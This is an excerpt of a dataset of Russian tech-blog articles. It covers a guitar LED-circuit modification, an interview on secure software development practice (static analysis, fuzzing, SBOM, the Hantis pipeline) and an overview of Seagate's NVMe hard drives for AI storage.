Зато имеется светомузыка — глаза кота, подмигивающие в такт игре на инструменте. И она тоже нуждается в усовершенствовании.  ▍ Устраняем микрофонный эффект Изначально в котогитару была установлена плата простейшего китайского радиоконструктора, зажигающего светодиоды под действием сигнала с миниатюрного электретного микрофона.    Этот эффект срабатывал даже от негромких разговоров в комнате, и заклеивание микрофона не помогало: он ловил вибрации деки гитары. Нетрудно догадаться, что при выступлении на сцене глаза кота будут просто светиться постоянно, вне зависимости от игры музыканта.  Усугубляет проблему то, что мной применены самомигающие RGB-светодиоды со встроенными контроллерами, создающими сильнейшие помехи по питанию.    Сигнал от питающих светодиоды проводов отчётливо ловил даже хамбакер. После замены звукоснимателя на сингл дела, очевидно, пойдут совсем плохо.    Поэтому я припаяю электролитический конденсатор номиналом 1 микрофарад в непосредственной близости от каждого из двух RGB-светодиодов.    Для каждого конденсатора придётся сделать специальное углубление в деке, и заодно канал для проводов, чтобы они не шли поверху, как в изначальном варианте.    Так гораздо лучше. С платы удалены два компонента — микрофон и питавший его резистор R1.    Теперь светомузыкальный эффект будет получать управляющий сигнал не с микрофона, а со звукоснимателя, причём бриджевого, чтобы минимизировать вероятность самовозбуждения схемы.  ▍ Заключительные штрихи Давно хотелось сделать декупаж на перо грифа, и сейчас для этого самое время.     Мной использован принт N1 от фирмы «Трафареты24». Следует иметь в виду, что это не рисовая бумага, а классическая декупажная карта, и она очень легко рвётся, особенно в намоченном состоянии.  Ещё одна приятная обновка — поворотно-откидная крышечка колодца гайки анкерного стержня. Чистокровная китайская прямиком с Aliexpress, поэтому требует немного работы алмазным надфилем перед установкой.    Теперь для настройки прогиба грифа не понадобится отвёртка, «колокольчик» и его шурупы никуда не потеряются, а отверстия под последние не расширятся так, что потребовало бы ремонта зубочистками.    Такая красота получилась в итоге.     Теперь пора устанавливать струны и пробовать обновлённый инструмент в действии.  ▍ И тут всё пошло не по плану Давайте ещё раз взглянем на принципиальную схему светомузыкального эффекта.    Здесь применены два транзистора S9014 с буквенным индексом «C». Статический коэффициент усиления по току находится в пределах от 200 до 600, а R2 = 100R3.  Поэтому при отсутствии сигнала на входе транзистор Q1 будет пребывать в режиме насыщения, потенциал его коллектора окажется ниже напряжения база-эмиттер Q2. Соответственно, последний закрыт, и светодиоды не получают питания. Отрицательная полуволна входного сигнала отнимает у Q1 ток базы, приходящий через R2. Q1 выходит из режима насыщения, и его коллекторный ток начинает падать, а вместе с ним и падение напряжения на R3.  Потенциал базы Q2 достигает величины прямого смещения эмиттерного перехода. Транзистор открывается и обеспечивает ток светодиодов, равный произведению тока базы на коэффициент усиления.     При питающем напряжении, равном 4.5 вольтам, максимально возможная разность потенциалов между выводами R3 составит почти 4 В, что означает ток базы, равный 400 микроамперам. Если умножить его на 600, получится 240 мА, что превышает допустимый ток и для транзистора, и для пяти светодиодов.  Однако 600 — это максимально возможный коэффициент усиления по току, потенциал базы в таком режиме будет ближе к 1 вольту, чем к 500 милливольтам, и открывается Q2 только на время пиков отрицательной полуволны входного сигнала.  Поэтому в отсутствии токоограничивающего резистора нет ничего страшного. К тому же, в котогитаре я использую самомигающие RGB-светодиоды, рассчитанные на прямое подключение к пятивольтовому источнику питания. Значит, мы можем быть уверенными в том, что котообразная светомузыка не сгорит. Однако возникла другая проблема.  Миниатюрный электретный микрофон снабжён встроенным усилителем сигнала в виде полевого транзистора с управляющим переходом. Но теперь микрофона нет, и сигнал гитарного звукоснимателя нужно подавать на базу Q1 через конденсатор C2.    Последний не помешало бы перевернуть, потому что резистор R1 теперь отсутствует тоже, и левый вывод C2 соединён с общим проводом через катушку звукоснимателя.   Однако постоянное смещение базы Q1 недостаточно для электрохимического растворения оксидной плёнки конденсатора. И R1 скоро вернётся в схему, но давайте обо всём по порядку.  Если подключить звукосниматель к C2 напрямую, то эта самая величина прямого смещения базы становится ограничителем амплитуды отрицательной полуволны сигнала.  Получается встроенный фузз, и надо признаться, что мне очень нравится, как он звучит. Регулировки степени перегруза, как у Форманты 241-БЛ, здесь нет, зато можно регулировать тембр и подмешивать искажённый сигнал бриджевого звукоснимателя к чистому сигналу некового в разных пропорциях.    Однако необходимо сохранить возможность пользоваться чистым сигналом бриджевого датчика.   Простейшим вариантом решения проблемы будет установка резистора сопротивлением в несколько десятков килоом между выходом звукоснимателя и входом эффекта. Этот резистор можно закорачивать выключателем, тем самым активируя фузз. Но, к сожалению, сигнал моих любимых китайских P-90 довольно слабый, и при внесении резистора чувствительности светомузыкальной схемы перестаёт хватать. Придётся искать другое решение.  Можно заменить нековый датчик на «горячий» хамбакер с магнитом ЮНДК наподобие Wilkinson WVHZ, прекрасно показавших себя на электрогитаре Cort Gasoline.    В моём распоряжении есть ЮНДК магниты и несколько полноразмерных китайских хамбакеров, куда можно их установить, от 6-килоомных до 14-килоомных.     Тем не менее, на котогитаре всё-таки хочется иметь два P-90, хотя бы потому, что амплитудное ограничение сигнала бриджевого хамбакера эмиттерным переходом транзистора наверняка окажется не таким благозвучным.   Тогда придётся опытным путём подбирать фильтр с подходящими параметрами. И получится инструмент с формулой датчиков как у Хеннинга Паули, дополнительно оборудованный продвинутым темброблоком и встроенным фуззом.     Этим я тоже когда-нибудь займусь, но сегодня надо решить вопрос без замены звукоснимателя. Проще всего повысить сопротивление R2, что сделает светомузыкальный эффект более чувствительным.    Но для доступа к плате светомузыки придётся снимать струны и извлекать нековый датчик, а мне не хочется этого делать.     Поэтому я просто отверну заднюю крышку темброблока и установлю там простейший буферный предусилитель с высоким входным сопротивлением, состоящий всего из двух деталей — полевого транзистора с управляющим переходом и резистора в цепи стока.    Установить второй «тяни-толкай» не представляется возможным, так как высота переменного резистора с переключателем не позволит установить батарейный отсек.   Придётся просверлить лишнее отверстие и установить маленький тумблер, на котором я и смонтирую оба компонента предусилителя плюс дополнительный электролитический конденсатор по питанию.    Так выглядит финальная версия темброблока.    ▍ Слушаем, что получилось Видео на Rutube Видео на Youtube Ссылка на видео   Итак, микрофонный эффект устранён целиком и полностью. Нековый звукосниматель продолжает ловить помехи от светомузыки, но они звучат, что называется, «в тему». И палитра тембров стала весьма обширной, причём без лишних сложностей в управлении.  Так неудачный эксперимент с подключением звукоснимателя вместо микрофона обернулся большой удачей, и появилась пища для размышлений на темы будущих проектов.  © 2025 ООО «МТ ФИНАНС»   Telegram-канал со скидками, розыгрышами призов и новостями IT 💻"
45,Безопасная разработка на конвейере. Интервью с Николаем Костригиным,Базальт СПО,Компания,0,Программное обеспечение,2025-04-10," Вопрос: В декабре 2024 года на полях открытой конференции ИСП РАН вы получили награду в номинации «Лучшая командная работа по статическому анализу» от ФСТЭК России и Центра исследований безопасности системного ПО ИСП РАН. Расскажите об этой награде и о вашей команде. Николай Костригин: С 2021 года при координации со стороны Института системного программирования РАН ведется работа по проверке свободного программного кода. В деятельности Консорциума сейчас участвуют более 60 организаций — это и институты, и коммерческие компании. Мы подключились с самого начала. Всё это делается с целью повышения доверия к программным компонентам, которые в мировом сообществе признаны критическими. Награждение в этом году происходило впервые, это подведение первых итогов деятельности Консорциума. Вопрос: Кто входит в Консорциум и какую он роль играет в обеспечении безопасности ПО? Н. Костригин: Основная роль Консорциума — организационная, координационная. Через Консорциум распределяются задачи, можно отслеживать, чтобы не было дублирования, когда мы что-то проверяем по собственной инициативе. Также Консорциум накапливает и систематизирует экспертизу в области проведения исследований. Она становится доступной участникам при присоединении. Работа по повышению безопасности отечественного ПО строится на совместных исследованиях, обмене результатами анализа, доработке и освоении новых инструментов выявления уязвимостей. Чтобы дать собеседнику представление о масштабах проблемы лежащей перед исследователями безопасности ПО, довольно часто прибегаю к количественному описанию GNU/Linux дистрибутива: в репозиторий свободного ПО входят десятки тысяч бинарных пакетов. В дистрибутиве, который включает около двух-трех тысяч пакетов, на поверхности атаки оказываются десятки пакетов. Совместная работа позволяет минимизировать дублирование исследований, сокращая время, которое проходит от попадания объекта исследований в поле зрения до появления значимых результатов: исправлений в исходном коде, доведенных до репозитория авторов проекта в upstream. Например, первичный статический анализ ядра Linux 5.10 выявил около сорока тысяч предупреждений. 20 компаний, работая в Консорциуме и объединив усилия, разметили 10 000 из них за год. На данный момент на сайте Консорциума значится около 500 патчей, принятых в основную ветку ядра. При сохранении количества участников и темпов работ, Консорциум может закончить разметку предупреждений статического анализатора за 4 года. Если компании будут выполнять все исследования самостоятельно, при тех же затратах людских ресурсов такая работа займет десятки лет. Часть исходного кода в более свежих ядрах не меняется, при их выходе не приходится начинать исследования с нуля, поэтому со временем работа должна ускориться. Все эти проверки — часть процессов РБПО — разработки безопасного программного обеспечения. Вопрос: Что такое РБПО, откуда появилось это понятие? Н. Костригин: Методология РБПО основана на понятии жизненного цикла безопасной разработки ПО, Secure software development lifecycle (SSDLC) по-английски, ее еще часто называют DevSecOps. SSDLC предусматривает меры по обеспечению безопасности на всех этапах жизненного цикла программного продукта, от разработки требований к ПО до реакции на инциденты во время его эксплуатации. Разумеется, центральное место в этом процессе занимает разработка и ей уделяется отдельное внимание. Обязательными составляющими РБПО являются статический и динамический анализ. Мы обе эти технологии активно применяем. Вопрос: Что такое статический анализ и какие виды анализа еще применяются? Н. Костригин: Есть правила создания безопасного кода, мы их придерживаемся. В наших продуктах используется и собственный код, и свободный код из международных проектов, и его необходимо проверить. Проверяется как сам текст программы — это статический анализ, так и корректность ее работы — соответственно, методами динамического анализа. Расскажу подробнее о статическом анализе кода. Он позволяет выявлять недостатки ПО, не запуская программу. Инструменты анализа проверяют код и помечают подозрительные места. Это своего рода робот-помощник, который экономит время на отсматривание кода глазами. Отмеченные роботом фрагменты кода называют предупреждениями. Есть универсальные инструменты, которые могут анализировать несколько языков. Есть специализированные для языка C/C++, например, свободные Clang Static Analyzer и CppCheck. Есть разработанный ИСП РАН анализатор Svace с инструментом разметки Svacer. Он проприетарный, но поддерживает довольно широкий спектр языков: C/C++, C#, Java, Kotlin, Go, Python, Scala, Visual Basic.NET, JavaScript. В Консорциуме, который создан на базе ИСП РАН, пользуются этим инструментом, так исторически сложилось. Вопрос: Что такое инструменты разметки? Расскажите подробнее, как с ними работают. Н. Костригин: Это инструменты, которые подсвечивают фрагменты кода, помеченные анализатором, позволяют перемещаться по коду программы между найденными предупреждениями и быстро понимать логику, по которой они выставлены. В этой же программе исследователь проставляет комментарии, принимает решение, является ли код ошибочным и подлежит ли он исправлению. Этот процесс называется разметкой. Здесь очень много зависит от квалификации. Вопрос: Какими инструментами статического анализа вы пользуетесь? Н. Костригин: По большей части мы используем Svace. Но поскольку ГОСТ требует диверсификации, то есть запрещает пользоваться только одним инструментом, мы применяем и другие. Тот же Clang Static Analyzer, который я уже упоминал. Вопрос: Когда анализатор выдал результат, что дальше происходит? Как определяют, что делать с той или иной ошибкой? Н. Костригин: Во-первых, предупреждение может быть истинным, а может быть ложноположительным. В последнем случае мы помечаем его как ошибочное и дальше с ним живем. Во-вторых, подтвержденное предупреждение тоже может быть разных уровней критичности. От стилистического нарушения, когда просто некрасиво написано, до четкого соответствия одному из видов недостатков. Недостатки классифицируются по CWE (Common Weakness Enumeration). Это общий перечень проблем и недочетов программного обеспечения, распространенных недостатков кода, принятый в международном сообществе. Не путать с CVE (Common Vulnerabilities and Exposures) — списком уже существующих уязвимостей ПО. Если найденный недостаток соответствует одному из этих CWE, то он, безусловно, требует исправления.   Вопрос: Какого рода недостатки позволяет выявлять статический анализ? Например, недокументированные возможности программы можно таким образом обнаружить? Н. Костригин: К сожалению, недокументированные возможности, если они заложены логикой программы, выявить статикой невозможно. Если программа написана четко, с соблюдением правил языка, с соблюдением всех норм, но в логику заложена недокументированная возможность, выявить ее может только динамическое исполнение или анализ кода специалистом. Статический анализатор не может знать, чего хотел программист, и какая из функций программы будет недокументированной, нежелательной или влиять на безопасность. Анализатор может искать ошибки копирования (copy-paste). Когда программист берет одну конструкцию, копирует, вставляет несколько раз, а потом во вставленном тексте просто меняет, допустим, x на y, y на z и так далее. Инструмент подсвечивает фрагменты, где, допустим, забыли поменять x на y. И другие подобные моменты. Среди недостатков кода выделяют 25 самых опасных1, которые нужно исправлять в первую очередь. Затем исправляются все остальные недостатки, влияющие на работоспособность, и как следствие — на безопасность. Вопрос: Если ошибка подтвержденная и подходит под классификацию, что вы делаете дальше? Н. Костригин: Проводится оценка влияния ошибки на безопасность системы. Затем разрабатывается патч для ее исправления, потом полный код программы опять подвергается анализу. Нужно убедиться, что в этом месте предупреждение исчезло. Напоминаю, большая часть проектов, над которыми мы работаем, это свободное ПО. Его разрабатывают программисты со всего мира, сотни тысяч человек, наверное. Поэтому, когда мы исправляем поведение программы, у нас самый очевидный и приоритетный путь — это пойти в upstream, к оригинальным разработчикам, и предложить им это исправление, чтобы уязвимость была исправлена для всего мира. Это также снимает с нас необходимость поддерживать изменения в собственных сборках программ. К сожалению, патчи не всегда охотно принимают. Есть те, кто считает «косметические» исправления необязательными. Иногда потенциальные и даже зарегистрированные уязвимости не исправляются длительное время, потому что разработчики, например, считают эти функции сложно эксплуатируемыми или вообще не эксплуатируемыми. Бывает, что ошибка проявляется только в нашей конфигурации, а для всего остального мира она неактуальна. Тогда мы делаем исправление у себя и его приходится поддерживать, вносить в каждое следующее обновление, а это большой труд. Совместная поддержка таких исправлений также происходит в рамках Консорциума. Вносить исправления в upstream, конечно, предпочтительнее. Показать актуальность ошибки может помочь разработка так называемого PoC-эксплойта, Proof of Concept, когда разрабатывается кусочек кода или методика для демонстрации этой уязвимости. Запускается программа с неисправленным кодом и выдает нежелательное поведение, которое было предсказано. Фактически это уже один из видов динамического анализа, которым мы тоже занимаемся. Вопрос: Если статическому анализу подвергается исходный код, то динамический — это исследование во время исполнения программы. Какие типы динамического анализа у нас применяются? Н. Костригин: Один из типов динамического анализа — фаззинг. В 2019 году для сертификации «Альт 8 СП» нам требовалось показать не только результаты статического анализа, но и результаты фаззинга. Эта работа легла на плечи разработчиков. Каждый осваивал технологию по-своему, мы успешно справились и получили первый опыт. В отличие от традиционных методов тестирования, фаззинг позволяет выявлять сложные ошибки, которые трудно обнаружить методами статического анализа или при функциональном тестировании. Фаззинг (от английского fuzzy — нечеткий, размытый) — это метод динамического тестирования, при котором в программу подаются случайные, некорректные или специально сгенерированные входные данные с целью выявления сбоев, неожиданных состояний и уязвимостей. Еще одно значение слова fuzzy — пушистый, что обыгрывается в названии одного из наиболее популярных фаззеров American Fuzzy Lop (AFL), оно происходит от породы кролика. Фаззеры можно классифицировать по разным критериям, включая метод тестирования, доступность информации о структуре данных и уровень доступа к тестируемой программе. В нашем арсенале уже больше десятка инструментов с разными областями применения. Среди них стоит выделить syzkaller — генеративный фаззер, тестирующий взаимодействие с ядром и драйверами путём подачи на вход мутированных системных вызовов. Для прикладного ПО чаще всего используются AFL++ (и другие  разновидности оригинального AFL) и libFuzzer. Это эволюционные или мутационные фаззеры. Они созданы, чтобы экономить время и ресурсы. Такой фаззер не перебирает все возможные случайные варианты, а отслеживает, к чему привело тот или иное воздействие. Он отбрасывает бесполезные наборы данных и мутирует полезные, чтобы продвинуться дальше по ходу программы. Очень похоже на эволюцию. С этим связан еще один термин — «покрытие кода». Известно, что в программе есть определенное количество строк, функций, базовых блоков. Если фаззер выдал набор данных и добрался до очередной строчки или до очередной функции, это означает увеличение покрытия кода. Эти данные учитываются как полезное воздействие и записываются в корпус. Корпус — это набор входных данных, которые приводят к увеличению покрытия. Если одно из воздействий приводит к падению программы или другому ожидаемому фаззером явлению, в этот момент использованный набор данных представляет собой готовый пример для воспроизведения ошибки. Очень часто программистам сложно подтвердить или опровергнуть наличие ошибки, когда нет надежного способа ее воспроизведения. А фаззер готовит тот вид данных, которые можно подать на вход программы и воспроизвести ошибку, а это уже половина дела при ее устранении. Вопрос: Есть и другие методы динамического анализа помимо фаззинга? Н. Костригин: Еще один метод — функциональное тестирование. У нас в компании есть отдел тестирования. С выходом новых версий его сотрудники по специально разработанным методикам прогоняют автоматические и ручные тесты с каждой версией программы, выявляя так называемые регрессы. Это появление ошибок, которых раньше не было, или исчезновение функций, которые раньше были. Следующий метод — юнит-тестирование. Это тесты, которые в самом коде программы обычно предусматривает программист. При сборке пакета, если исходный код содержит юнит-тесты, сопровождающие пакета (мейнтейнеры) всегда стараются их запускать. Это кусочки кода, которые передают функциям программы заранее известный ввод и ожидают заранее известный отклик. Если вдруг что-то отличается, то тесты падают. И на этом основании пакет не собирается до того, как придет мейнтейнер пакета или программист и устранит ошибку. Это может быть ошибка в коде, неправильная версия библиотеки или ошибка сборки на конкретной платформе. Допустим, на архитектуре x86_64 пакет собирается, а на aarch64 перестает собираться или не проходит тест. То есть мы используем в динамическом анализе практически для всех программ, как минимум, три техники: фаззинг, функциональное тестирование и юнит-тестирование. Вопрос: Какие еще методы, кроме статического анализа и фаззинга,  вы применяете? Н. Костригин:  Мы активно используем определение поверхности атаки и композиционный анализ. Поверхность атаки — это совокупность всех точек взаимодействия системы с внешней средой, через которые потенциальный злоумышленник может попытаться осуществить атаку. Это могут быть сетевые интерфейсы, API, файловая система, библиотеки и даже пользователи с различными уровнями доступа. Минимизация поверхности атаки — одна из ключевых задач обеспечения безопасности. Все внутренние разработки и компоненты свободного ПО, определенные как элементы поверхности атаки наших продуктов, обязательно проверяются различными доступными методами. Композиционный анализ сложного ПО (или построение software bill of materials, сокращенно SBoM) позволяет определить полный перечень используемых компонентов, включая заимствованные библиотеки и их зависимости. Это помогает выявлять уязвимые или устаревшие модули, обеспечивая прозрачность цепочки поставок программного обеспечения. Такой анализ критически важен для управления безопасностью и соблюдения нормативных требований. Вопрос: Создается ощущение, что практики РБПО — это огромная работа, как вы с ней справляетесь? Есть какая-то автоматизация? Н. Костригин: С самых первых дней было понятно, что мы тратим очень много времени на ручной запуск исследований, отслеживание их результатов. Требовалась система, которая бы автоматически запускала уже разработанные методики, приглядывала за ними, собирала с них метрики, регистрировала падения, сохраняла результаты в базе данных. Чтобы получать только пищу для размышлений с минимумом рутины. И мы создали инструмент Hantis, конвейер автоматизации, который позволяет всё это делать. Название происходит от одноименного вида спорта (Hantis — от Hand Tennis). В него играют от двух до четырех человек на четырех столах. Процесс исследований очень похож именно на этот вид спорта. Проекты, исследуемые разными инструментами, переходят от одного исполнителя к другому, развиваются, возвращаются к автору, и так по кругу. Мы обобщили опыт методик фаззинга из разных проектов и разработали структуру инструментального Git-репозитория таким образом, чтобы можно было пакеты из Sisyphus и его стабильных бранчей как бы обволакивать этим инструментальным репозиторием, подключаться к ним сбоку. И при обновлении версии ПО в Sisyphus или его бранче просто воспроизводить очередные исследования. Фаззинг может длиться днями и месяцами. Поскольку большая часть исследований ведется в контейнерах, мы решили в основу Hantis заложить Kubernetes. Не все процессы анализа можно поместить в контейнеры, некоторые из них требуют использования виртуальных машин, с которыми Kubernetes не может работать напрямую. Также есть типы анализа, которые выполняются быстро, в отличие от фаззинга. Чтобы эти разнородные процессы включить в один общий конвейер, мы создали механизм расширения, назвали эти плагины Hunters — «охотники». Всё это мы разрабатываем под свободной лицензией GNU AGPLv3, и планируем обнародовать, когда код будет готов к релизу.   Вопрос: С такой автоматизацией вы сможете быстрее завершить все проверки и полностью подтвердить безопасность ПО? Н. Костригин: ГОСТ Р 56939-2024 «Защита информации. Разработка безопасного программного обеспечения. Общие требования» предусматривает 25 обязательных мероприятий, начиная с обучения работников и планирования требований к самому ПО, далее проходя все стадии: написание кода, исследование кода, проверка перед внедрением, функциональное тестирование, реакцию на инциденты безопасности при его эксплуатации и так далее. И вновь возвращается на этап планирования. Это замкнутый круг, который никогда не заканчивается. Вопрос: Спасибо за интервью.1https://cwe.mitre.org/top25/ "
46,NVMe для HDD: как новая технология решает проблемы хранения данных ИИ,mClouds.ru,Облачный IaaS провайдер,0,"Связь и телекоммуникации, Домены и хостинг",2025-04-10,"Системы искусственного интеллекта сталкиваются с серьезной проблемой: как хранить и обрабатывать огромные объемы данных, необходимые для обучения и работы моделей. Традиционные решения уже не справляются с требованиями скорости, масштабируемости и экономичности. Решением могут стать жесткие диски с интерфейсом NVMe. Они сочетают в себе экономичность HDD с производительностью NVMe, устраняя узкие места в системах хранения данных для ИИ. Seagate впервые представила прототип таких накопителей в 2021 году на саммите Open Compute Project, а в марте 2025 года на конференции GTC компания продемонстрировала уже полноценное решение, интегрирующее NVMe HDD с современной платформой Mozaic 3+ и процессорами обработки данных NVIDIA BlueField-3.Разбираемся, как NVMe HDD могут изменить подход к хранению данных для ИИ и стать ключевым элементом будущих инфраструктур.Почему ИИ не хватает места для хранения данныхТребования к хранению данных искусственного интеллекта стремительно растут. Это не просто техническая проблема, а фундаментальное ограничение, которое может замедлить развитие всей отрасли.Для обучения ИИ требуется огромное количество данных — часто терабайты. Хранить такие объемы информации на традиционных накопителях становится всё сложнее и дороже. Твердотельные накопители (SSD). На современных SSD с интерфейсом PCIe 5.0 уже достигаются впечатляющие скорости. Например, представленный в марте 2025 года Samsung 9100 PRO обеспечивает последовательную скорость чтения до 14 800 МБ/с и записи до 13,4 ГБ/с, по IOPS тоже все хорошо, хоть диски и не для сегмента дата-центров.Однако их основной недостаток — высокая стоимость за терабайт по сравнению с другими типами накопителей. Хранение 1 ТБ данных на SSD обходится примерно в 5–10 раз дороже, чем на HDD.Вторая проблема — интенсивные рабочие нагрузки. Обучение ИИ ускоряет износ SSD, сокращает их срок службы и увеличивает TCO (общую стоимость владения). Например, в средах с интенсивной записью данных, таких как Redis on Flash, SSD могут потребовать замены уже через 18 месяцев, что в 2–3 раза быстрее, чем при стандартных нагрузках.Традиционные HDD (SAS/SATA). Жесткие диски остаются самым доступным вариантом для хранения больших объемов данных, но их архитектура затрудняет работу с ИИ. В серверных средах и центрах обработки данных HDD подключаются через специальные контроллеры: HBA (Host Bus Adapter) или RAID-контроллеры. Эти контроллеры работают как мост между дисками и шиной PCIe компьютера для передачи данных. Однако если использовать SAS-экспандер или порт-мультипликатор SATA и подключать через них большое количество дисков, то общая пропускная способность канала распределяется между всеми устройствами. Это ограничивает скорость доступа к данным. Интерфейс SATA III ограничен теоретической пропускной способностью около 600 МБ/с как для чтения, так и для записи. SAS-4 ограничен около 2800–3000 МБ/с как для чтения, так и для записи. Всё это ниже, чем у современных интерфейсов PCIe/NVMe. Для сравнения: современные NVMe SSD на базе PCIe Gen5 обеспечивают скорость последовательного чтения до 14 500 МБ/с и записи до 12 700 МБ/с, что делает их идеальными для высокопроизводительных задач ИИ.Облачные хранилища. Облачные решения предлагают теоретически неограниченные ресурсы для хранения данных. Так современные платформы машинного обучения обычно развертываются прямо в облаке, где модели обучаются на том, что хранится в том же облачном окружении. Это устраняет необходимость передачи больших объемов данных через интернет. Например, мы в mClouds в декабре представили новую GPU-платформу для работы с ИИ. Там мы используем исключительно локальные NVMe накопители и видеокарты NVIDIA L40S. Такая архитектура дает необходимую пропускную способность для работы с нейросетями и для обучения LLM-моделей, ускоряя процессы в 1,5–2 раза по сравнению с традиционными решениями на базе систем хранения, подключенных по iSCSI или FC.Однако для быстрой работы ИИ важно правильно хранить данные. Плохая организация замедляет доступ к ним. Например, разбросанные по разным папкам файлы или неудобные форматы данных увеличивают время загрузки. При обучении распознаванию изображений на миллионах фотографий нужно использовать подходящие форматы и правильно сортировать данные. Многие облачные сервисы предлагают специальные инструменты для ускорения доступа к данным. Например, технология GPU Direct Storage позволяет передавать информацию напрямую из хранилища в графический процессор. Однако даже с такими инструментами облачные решения сталкиваются с проблемами: ограничениями в виртуализированных средах, сложностями с прямым доступом к памяти через IOMMU и VFIO, зависимостью от конкретной облачной инфраструктуры, а также задержкой при соединениях между GPU и системами хранения. В результате производительность часто оказывается ниже ожидаемой, особенно при масштабных задачах ИИ.Все три решения не идеальны. Хотя современные технологии хранения данных помогают работать с ИИ, у каждой из них есть свои ограничения. SSD очень быстрые, но дорогие для хранения больших объемов данных. Жесткие диски доступны по цене, но медленные. А облачные хранилища зависят от того, как в них организовано хранение данных.Seagate предлагает новый подход — NVMe для HDD. Компания впервые продемонстрировала эту технологию еще в 2021 году на Open Compute Project Global Summit, а в марте 2025 года представила новое решение — жесткие диски с быстрым интерфейсом NVMe, интегрированные с современной платформой Mozaic 3+. Теперь быстрый интерфейс NVMe, ранее используемый только в SSD, стал доступен и для традиционных жестких дисков. Как NVMe делает обычные HDD быстрееПротокол NVMe (Non-Volatile Memory Express) изначально был создан для твердотельных накопителей. Сейчас эту технологию адаптируют для жестких дисков. Вместо использования специализированных контроллеров и адаптеров жесткие диски NVMe подключаются напрямую к шине PCIe, точно так же как высокопроизводительные SSD. Это устраняет несколько промежуточных звеньев в цепочке передачи данных, снижает задержки и увеличивает пропускную способность.У жестких дисков NVMe есть три больших преимущества в работе с ИИ:Прямой доступ GPU к данным. В традиционных системах графические процессоры, которые выполняют вычисления для моделей ИИ, не могут напрямую обращаться к данным на жестких дисках. Вместо этого данные проходят через центральный процессор, что создает дополнительные задержки и нагрузку на систему.В будущем NVMe HDD в сочетании с блоками обработки данных (DPU, Data Processing Units) позволят графическим процессорам получать данные напрямую из хранилища. Интеграция с Mozaic 3+. В новейших NVMe HDD Seagate использует платформу Mozaic 3+ — технологию, которая увеличивает плотность записи данных до 3 ТБ на пластину благодаря тепловой магнитной записи (HAMR). Это позволяет утроить емкость хранилища в том же физическом пространстве и снизить энергопотребление на терабайт на 40% по сравнению с традиционными HDD. Единый программный стек для всех типов накопителей. При использовании комбинированных систем SSD и HDD нужны разные драйверы и программные интерфейсы для каждого типа накопителей.В новом решении NVMe HDD за счет единого стека жесткие диски и твердотельные накопители могут работать вместе более согласованно. Можно будет создавать многоуровневые системы хранения, где «горячие» данные, к которым часто обращаются, размещаются на быстрых SSD, а большие объемы «холодных» данных — на более емких и доступных по цене HDD.Преимущества NVMe HDD уже проверяются на практике. Seagate тестирует работу NVMe HDD на своих производственных линиях, где создаются компоненты для новых жестких дисков. На этих производствах системы с искусственным интеллектом проверяют качество деталей, анализируя множество снимков в поисках дефектов. Для такой работы нужно быстро обрабатывать и хранить большие объемы изображений. Именно здесь пригождаются NVMe HDD: они позволяют хранить все эти данные без потери качества и обеспечивают быстрый доступ к ним для постоянного обучения ИИ-моделей.Ограничения и альтернативы NVMe: что нужно учитыватьДобавление интерфейса NVMe к жестким дискам не устраняет их ограничений:Время поиска и вращательная задержка сдерживают скорость доступа к данным. Диски с частотой 7200 RPM, которые наиболее распространены в настольных компьютерах, имеют среднюю вращательную задержку 4,17 мс. Для сравнения: у NVMe SSD Kingston DC1000M задержка чтения составляет 0,3 мс. Это примерно в 10–14 раз быстрее, чем у HDD. Даже с интерфейсом NVMe жесткий диск не может превысить физические ограничения, связанные со скоростью вращения пластин и перемещением головок.Операции произвольного доступа выполняются медленнее, чем на SSD. В то время как NVMe SSD могут обрабатывать сотни тысяч операций ввода-вывода в секунду (IOPS), NVMe HDD дают лишь незначительное улучшение — примерно на 10–15% по сравнению с традиционными SAS / SATA HDD, которые в среднем дают от 200 до 400 IOPS.Чувствительность к вибрациям и физическим воздействиям остается проблемой для любых HDD. В том числе и для моделей с NVMe. В средах с высокой плотностью размещения оборудования это может снижать производительность и повышать риск отказов.Высокая стоимость оборудования. Seagate отметила, что она использовала специализированное оборудование, в том числе NVIDIA BlueField DPU. Это процессор обработки данных, который сочетает в себе многоядерный ARM-процессор и высокопроизводительный сетевой интерфейс до 400 ГБ/с. BlueField-3 DPU стоит около 3600–4000 долларов США за единицу, что делает его недоступным для небольших организаций.Для организаций с ограниченным бюджетом альтернативой остаются гибридные системы хранения, где сочетают обычные HDD с SSD-кешированием. Такой подход дает разумный баланс между производительностью и стоимостью, при этом позволяет получить часть преимуществ высокоскоростных хранилищ без полной модернизации инфраструктуры.Итак, что нужно знать о NVMe HDDSeagate представила первые NVMe HDD в 2021 году на OCP Global Summit. Технологию показали на примере 2U JBOD-системы с 12 жесткими дисками, подключенными через PCIe 3.0. JBOD — это компактная система хранения, обычно размещаемая в стандартном серверном корпусе высотой 2U (около 8–9 см), предназначенная для расширения емкости хранилища.Хотя эта система уже позволяла подключать HDD напрямую к шине PCIe, у нее были ограничения. Прототип использовал специальный контроллер, который поддерживал все основные протоколы (SAS, SATA и NVMe), но сама архитектура представляла собой лишь базовое решение без интеграции с другими компонентами экосистемы хранения данных. Такая конфигурация не обеспечивала прямой доступ GPU к данным и не решала проблему задержек при обработке ИИ-нагрузок.К 2025 году Seagate усовершенствовала технологию. На конференции GTC 2025 компания показала полноценное решение, которое объединяло восемь NVMe HDD с современной платформой Mozaic 3+, четыре NVMe SSD для кеширования и процессор обработки данных NVIDIA BlueField-3.Ключевое улучшение в новой демонстрации — интеграция с DPU (Data Processing Units), которая позволила создать прямой путь данных между GPU и хранилищем. Это снизило задержки в рабочих процессах ИИ, поскольку графические процессоры теперь могут получать данные напрямую из хранилища, что особенно важно для обучения моделей ИИ.Компания разрабатывает комплексную дорожную карту для создания следующего поколения систем хранения данных для ИИ, которая включает в себя несколько ключевых направлений:Увеличение емкости хранилищ. Дальнейшее масштабирование платформы Mozaic для разработки NVMe HDD еще большей емкости. Сейчас поставляют накопители объемом 36 ТБ.Развитие технологии NVMe-oF. Она позволяет подключать жесткие диски NVMe через сетевые структуры. Задержка — менее 20 микросекунд, пропускная способность — до 31,5 ГБ/с для PCIe 4.0. Это делает возможным доступ к централизованным массивам хранения с производительностью, сопоставимой с локальным подключением.Создание эталонных архитектур. Разработка детальных технических схем и рекомендаций, которые помогут компаниям быстро развернуть оптимизированные системы хранения для задач ИИ без необходимости разрабатывать архитектуру с нуля. Такие решения включают оптимальные конфигурации оборудования, схемы подключения и настройки программного обеспечения.Точные сроки выхода коммерческих NVMe HDD на массовый рынок пока не объявлены, но Seagate продолжает активно развивать эту технологию. Ожидается, что NVMe HDD займут нишу между высокопроизводительными, но дорогими SSD и традиционными, более медленными HDD, предлагая оптимальное сочетание скорости, объема и стоимости для растущих 